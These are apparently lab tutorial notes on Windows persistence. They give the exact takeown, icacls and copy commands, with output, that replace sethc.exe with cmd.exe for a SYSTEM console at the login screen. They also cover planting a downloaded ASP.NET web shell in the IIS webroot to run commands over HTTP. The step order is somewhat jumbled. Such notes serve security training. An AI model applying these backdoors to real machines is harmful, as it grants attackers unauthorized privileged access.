# Using Web Shells

* After pressing SHIFT 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`.
* If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
* A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`.
* That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
* To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it.
* Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:
* If you notice the compromised target is hosting a web server, we can take advantage of this.
* Download A ASP.NET web shell.
* https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
* Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:

```
takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

```
move shell.aspx C:\inetpub\wwwroot\
```

* After doing so, lock your session from the start menu:
* You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
* We can then run commands from the web server by pointing to the following URL:
* `http://MACHINE_IP/shell.aspx`
